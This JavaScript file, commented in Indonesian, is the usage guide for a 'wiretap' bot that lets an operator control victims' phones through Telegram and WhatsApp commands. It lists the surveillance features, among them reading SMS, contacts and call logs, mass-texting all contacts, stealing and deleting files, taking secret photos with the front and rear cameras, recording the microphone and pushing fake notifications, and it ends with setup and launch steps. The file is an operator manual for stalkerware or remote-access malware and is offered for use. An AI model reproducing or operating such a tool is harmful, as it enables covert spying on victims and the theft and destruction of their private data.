/**
 * Cara Penggunaan Bot Dual-Platform (Telegram + WhatsApp)
 * 
 * File ini berisi petunjuk penggunaan bot sadap dual-platform
 * yang mendukung Telegram dan WhatsApp secara bersamaan.
 */

// CARA PENGGUNAAN BOT TELEGRAM

/*
1. Mulai bot dengan mengirim perintah /start
2. Gunakan tombol "📖 DAFTAR KORBAN" untuk melihat perangkat yang terhubung
3. Gunakan tombol "☠️ SADAP KORBAN" untuk memilih perangkat dan mengakses fitur-fitur sadap
4. Pilih perangkat yang ingin disadap dari daftar yang muncul
5. Pilih fitur yang ingin digunakan dari menu yang tersedia
6. Ikuti instruksi yang muncul untuk menggunakan fitur-fitur tertentu

Perintah Telegram:
- /start - Memulai bot dan melihat pesan selamat datang
- /help - Menampilkan pesan bantuan
- /menu - Menampilkan menu utama
*/

// CARA PENGGUNAAN BOT WHATSAPP

/*
1. Kirim pesan .menubot untuk melihat daftar perintah yang tersedia
2. Gunakan perintah .daftarkorban untuk melihat perangkat yang terhubung
3. Gunakan perintah .sadapkorban untuk memilih perangkat dan mengakses fitur-fitur sadap
4. Pilih perangkat yang ingin disadap dengan membalas pesan dengan nomor perangkat
5. Pilih fitur yang ingin digunakan dengan membalas pesan dengan nomor fitur
6. Ikuti instruksi yang muncul untuk menggunakan fitur-fitur tertentu

Perintah WhatsApp:
- .menubot - Menampilkan menu utama
- .help - Menampilkan bantuan penggunaan
- .daftarkorban - Melihat daftar perangkat korban
- .sadapkorban - Memilih perangkat untuk disadap
- .info - Informasi tentang bot
- .ping - Cek status bot
*/

// FITUR-FITUR SADAP

/*
Berikut adalah fitur-fitur sadap yang tersedia:

1. Info HP - Mendapatkan informasi detail tentang perangkat
2. Aplikasi - Melihat daftar aplikasi yang terinstal
3. Kontak - Melihat daftar kontak
4. Riwayat Telp - Melihat riwayat panggilan
5. SMS - Melihat pesan SMS
6. Kirim SMS - Mengirim SMS dari perangkat target
7. Kirim SMS ke semua kontak - Mengirim SMS ke semua kontak
8. Ambil File - Mengakses file dari perangkat
9. Hapus File - Menghapus file dari perangkat
10. Kamera Depan - Mengambil foto dari kamera depan
11. Kamera Belakang - Mengambil foto dari kamera belakang
12. Rekam Suara - Merekam suara dari mikrofon
13. Teks Layar - Menampilkan pesan di layar
14. Buat Notifikasi - Membuat notifikasi palsu
15. Kirim Getaran - Mengirim getaran ke perangkat
*/

// KONFIGURASI BOT

/*
Edit file config.js untuk mengkonfigurasi bot:

const config = {
  // Telegram configuration
  token: 'YOUR_TELEGRAM_BOT_TOKEN',
  id: 'YOUR_TELEGRAM_USER_ID',
  
  // WhatsApp configuration
  nomerwa: 'YOUR_WHATSAPP_NUMBER', // with country code, e.g. '6281234567890'
  
  // Shared configuration
  surya: 'ADDITIONAL_ADMIN_ID',
  address: 'https://www.google.com',
  
  // Bot settings
  prefix: '.',
  botName: 'DualBot',
  ownerName: 'YourName',
  
  // Server settings
  port: process.env.PORT || 8999
};
*/

// MENJALANKAN BOT

/*
1. Pastikan Node.js dan npm sudah terinstal di sistem Anda
2. Instal dependensi dengan menjalankan:
   npm install
3. Edit file config.js dan sesuaikan dengan kebutuhan Anda
4. Jalankan bot dengan perintah:
   node index.js
5. Untuk WhatsApp, scan QR code yang muncul di terminal dengan aplikasi WhatsApp di ponsel Anda
*/

// CATATAN PENTING

/*
- Pastikan aplikasi target sudah terinstal di perangkat korban
- Bot ini hanya akan merespon perintah dari admin yang terdaftar di file konfigurasi
- Untuk fitur WhatsApp, pastikan nomor WhatsApp admin sudah dikonfigurasi dengan benar
- Beberapa fitur mungkin memerlukan izin tambahan di perangkat target
*/
